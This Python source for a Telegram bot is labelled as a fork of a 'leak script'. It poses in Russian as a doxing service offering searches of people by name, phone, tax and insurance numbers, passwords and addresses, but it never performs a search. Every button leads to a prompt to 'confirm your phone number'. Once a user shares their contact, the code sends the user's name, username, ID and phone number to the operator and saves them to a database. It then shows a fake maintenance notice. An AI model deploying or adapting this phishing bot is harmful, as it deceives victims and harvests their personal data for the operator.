"""
Fork from leak script @end_soft (https://t.me/End_Soft/4654)
forked by fairet
fairet (author fork) hasn't responsibility for your actions
"""

import telebot
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import json
import sqlite3


def parse(setting):
    """Parsing 'setting' from config.json"""
    with open ('config.json', 'r') as file:
        data = json.load(file)
        
    return data["config"][setting]

def add_to_database(number, user_id):
    """Adding number and user_id to databse from config.json"""

    connection = sqlite3.connect(parse("database"))
    cursor = connection.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS numbers (
            id INTEGER PRIMARY KEY,
            number INTEGER,
            user_id INTEGER
        )
    ''')

    cursor.execute('INSERT INTO numbers (number, user_id) VALUES (?, ?)', (number, user_id))

    connection.commit()
    connection.close()
	  
text_phone_number = """🗂 *Номер телефона*

Вам необходимо *подтвердить номер телефона* для того, чтобы *завершить идентификацию*.

*Для этого нажмите кнопку ниже.*"""

bot = telebot.TeleBot(parse("api_token"))

find_menu = types.InlineKeyboardMarkup()
button0 = types.InlineKeyboardButton('🔎Начать поиск', callback_data="start_dox")
find_menu.row(button0)
button1 = types.InlineKeyboardButton('⚙️Аккаунт', callback_data="dox")
button2 = types.InlineKeyboardButton('🆘Поддержка',callback_data="dox")
find_menu.row(button1,button2)
button3 = types.InlineKeyboardButton('🤖Создать собственный бот',callback_data="dox")
find_menu.row(button3)
button4 = types.InlineKeyboardButton('🤝Партнерская программа',callback_data="dox")
find_menu.row(button4)

@bot.message_handler(commands=['start'])
def start(message):
    """Sending start messages"""
    bot.send_message(message.from_user.id,"*Добро пожаловать!*",parse_mode="Markdown")
    bot.send_message(message.from_user.id,"*Выберите нужное действие:*",parse_mode="Markdown",reply_markup=find_menu)

@bot.callback_query_handler(func=lambda call: call.data == "start_dox")
def button0_pressed(call: types.CallbackQuery):
	"""Sending """
	bot.send_message(chat_id=call.message.chat.id,text= "👤 Поиск по имени\n"+\
											"├  `Блогер` _(Поиск по тегу)_\n"\
											"├  `Антипов Евгений Вячеславович`\n"\
											"└  `Антипов Евгений Вячеславович 05.02.1994`\n"\
											"_(Доступны также следующие форматы_ "+"`05.02`"+"_/_"+"`1994`"+"_/_"+"`28`"+"_/_"+"`20-28`"+"_)_\n\n"\
											"🚗 Поиск по авто\n"\
											"├  `Н777ОН777` - поиск авто по *РФ*\n"\
											"└  `ХТА21150053965897` - поиск по *VIN*\n\n"\
											"👨 *Социальные сети*\n"\
											"├  `https://www.instagram.com/violetta_orlova` - *Instagram*\n"\
											"├  `https://vk.com/id577744097` - *Вконтакте*\n"\
											"├  `https://facebook.com/profile.php?id=1` - *Facebook*\n"\
											"└  `https://ok.ru/profile/162853188164` - *Одноклассники*\n\n"\
											"📱 `79999939919` - для поиска по *номеру телефона*\n"\
											"📨 `tema@gmail.com` - для поиска по *Email*\n"\
   										    "📧 `#281485304`, `@durov` или `перешлите сообщение` - поиск по *Telegram* аккаунту\n\n"\
											"🔐 `/pas churchill7` - поиск почты, логина и телефона *по паролю*\n"\
											"🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)\n"\
											"🏘 `77:01:0001075:1361` - поиск по *кадастровому номеру*\n\n"\
											"🏛 `/company Сбербанк` - поиск по *юр лицам*\n"\
											"📑 `/inn 784806113663` - поиск по *ИНН*\n"\
											"🎫 `/snils 13046964250` - поиск по *СНИЛС*\n\n"\
											"📸 Отправьте *фото человека*, чтобы найти его или двойника на сайтах *ВК*, *ОК*.\n"\
											"🚙 Отправьте *фото номера автомобиля*, чтобы получить о нем информацию.\n"\
											"🙂 Отправьте *стикер*, чтобы найти *создателя*.\n"\
											"🌎 Отправьте *точку на карте*, чтобы *найти людей*, которые сейчас там.\n"\
											"🗣 С помощью *голосовых команд* также можно выполнять *поисковые запросы*.",parse_mode="Markdown")

send = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
button_phone = types.KeyboardButton(text="✅Подтвердить", request_contact=True)
send.add(button_phone)

@bot.callback_query_handler(func=lambda call: call.data == "dox")
def button1_pressed(call: types.CallbackQuery):
    # Call back when pressed any button
	bot.send_message(chat_id=call.message.chat.id,text=text_phone_number,parse_mode="Markdown",reply_markup=send)

@bot.message_handler(content_types=['contact']) 
def contact(message):
    """Sending logs to admin_id if contact isn't None"""
    if message.contact is not None:
        bot.send_message(parse("admin_id"),"*🔔Новый лог!*\n"+\
        	"Имя: `"+message.from_user.first_name+\
        	"\n`Логин: @"+message.from_user.username+\
            f"\nАйди: {message.from_user.id}"
        	"\nНомер телефона: `"+message.contact.phone_number+"`",parse_mode="Markdown")
        add_to_database(message.contact.phone_number, message.from_user.id)
        bot.send_message(parse("admin_id",f'*Данные записаны в {parse("database")}*'), parse_mode="Markdown")
        bot.send_message(message.from_user.id,"*⚠️ Технические работы до 05:00 по мск.*\n\nРаботы будут завершены в данный промежуток времени, все подписки продлены.",parse_mode="Markdown",reply_markup=types.ReplyKeyboardRemove())
        
@bot.message_handler(content_types=['text'])
def handler(message):
	"""Always sending confirm number paste"""
	bot.send_message(message.from_user.id, text_phone_number, parse_mode="Markdown", reply_markup=send)

bot.polling(none_stop=True)